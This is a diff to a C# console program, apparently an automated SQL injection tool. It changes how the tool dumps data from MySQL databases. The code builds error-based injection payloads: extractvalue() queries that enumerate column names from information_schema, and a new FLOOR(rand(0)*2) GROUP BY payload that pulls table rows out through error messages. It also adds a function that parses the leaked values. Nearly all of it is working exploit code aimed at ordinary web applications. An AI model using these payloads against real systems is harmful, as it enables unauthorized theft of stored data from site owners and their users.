@@ -97,7 +97,7 @@ namespace SQL_Injector_Console
 
                     while (error != "**NOTHING FOUND**")
                     {
-                        //Console.WriteLine($"' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='{database}' LIMIT {tableIndex},1))); #");
+                        //Console.WriteLine($"' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{table.Value}' AND table_schema = '{table.Key}' LIMIT {columnIndex},1))); #");
                         strings = GetStringArray($"' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{table.Value}' AND table_schema = '{table.Key}' LIMIT {columnIndex},1))); #");
                         error = FindError(strings);
                         if (error != "**NOTHING FOUND**")
@@ -150,13 +150,14 @@ namespace SQL_Injector_Console
                                 }
                             }*/
                             //Console.WriteLine($"' AND extractvalue(rand(),concat(0x3a,(SELECT concat({columnsString})   FROM   {table.Key}.{table.Value}   LIMIT {dataIndex},1))); #");
-                            strings = GetStringArray($"' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,{columnsString})   FROM   {table.Key}.{table.Value}   LIMIT {dataIndex},1))); #");
+                            //strings = GetStringArray($"' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,{columnsString})   FROM   {table.Key}.{table.Value}   LIMIT {dataIndex},1))); #");
+                            strings = GetStringArray($"' AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT concat(0x3a,{columnsString}) FROM {table.Key}.{table.Value} LIMIT {dataIndex},1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #");
                             error = FindError(strings);
                             if (error != "**NOTHING FOUND**")
                             {
                                 error = error.Replace(" ", "");
-                                Console.WriteLine(SplitStringAnswer(error));
-                                data.Add(new KeyValuePair<string, KeyValuePair<string, List<KeyValuePair<string, string>>>>(table.Key, new KeyValuePair<string, List<KeyValuePair<string, string>>>(table.Value, new List<KeyValuePair<string, string>>(CreateColumnDataList(SplitStringAnswer(error), list)))));
+                                Console.WriteLine(SplitStringAnswerData(error));
+                                data.Add(new KeyValuePair<string, KeyValuePair<string, List<KeyValuePair<string, string>>>>(table.Key, new KeyValuePair<string, List<KeyValuePair<string, string>>>(table.Value, new List<KeyValuePair<string, string>>(CreateColumnDataList(SplitStringAnswerData(error), list)))));
                                 dataIndex++;
                             }
                         }
@@ -220,8 +221,16 @@ namespace SQL_Injector_Console
         string SplitStringAnswer(string answer)
         {
             string output = answer.Substring(answer.IndexOf(':') + 4);
-            output = output.Replace(" ", "");
             output = output.Remove(output.Length - 1, 1);
+            output = output.Replace(" ", "");
+            return output;
+        }
+
+        string SplitStringAnswerData(string answer)
+        {
+            string output = answer.Substring(answer.IndexOf(':') + 2);
+            output = output.Remove(output.Length - 23, 1);
+            output = output.Replace(" ", "");
             return output;
         }
 
